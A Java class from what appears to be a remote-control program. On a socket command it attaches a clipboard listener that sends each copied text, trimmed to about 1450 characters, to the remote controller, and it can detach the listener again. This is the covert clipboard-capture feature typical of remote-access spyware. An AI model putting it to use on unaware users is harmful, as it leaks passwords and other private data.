/*
 * Created by VyVu
 * 
 *  @author vutrivi99@gmail.com
 */
package controller.receive;

import java.awt.HeadlessException;
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.FlavorEvent;
import java.awt.datatransfer.FlavorListener;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import java.nio.channels.SocketChannel;

import controller.PacketHandler;

// TODO: Auto-generated Javadoc
/**
 * The Class ClipboardDetectReceiver.
 */
public class ClipboardDetectReceiver {
	
	/** The listener. */
	private static FlavorListener l;
	
	/**
	 * On function.
	 *
	 * @param socketChannel the socket channel
	 * @param length the length
	 * @return always false to always at readable state
	 * @throws NumberFormatException the number format exception
	 * @throws IOException Signals that an I/O exception has occurred.
	 */
	public static boolean on(SocketChannel socketChannel) throws NumberFormatException, IOException {
		if(Toolkit.getDefaultToolkit().getSystemClipboard().getFlavorListeners().length>0) return false;
		Toolkit.getDefaultToolkit().getSystemClipboard().addFlavorListener(l=new FlavorListener() { 
			   @Override 
			   public void flavorsChanged(FlavorEvent e) {
				   try {
					   String data=(String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
					   if(data.length()>1450) {
						   data=data.substring(0, 1446)+"...";
					   }
					   PacketHandler.write2Socket(socketChannel, (byte)3, data.getBytes());
				   } catch (HeadlessException | UnsupportedFlavorException | IOException e1) {
					   // TODO Auto-generated catch block
				   }
			   } 
		});
		return false;
	}
	
	/**
	 * Off function.
	 *
	 * @param socketChannel the socket channel
	 * @param length the length
	 * @return always false to always at readable state
	 * @throws NumberFormatException the number format exception
	 * @throws IOException Signals that an I/O exception has occurred.
	 */
	public static boolean off(SocketChannel socketChannel) throws NumberFormatException, IOException {
		if(Toolkit.getDefaultToolkit().getSystemClipboard().getFlavorListeners().length==0) return false;
		Toolkit.getDefaultToolkit().getSystemClipboard().removeFlavorListener(l);
		return false;
	}
}
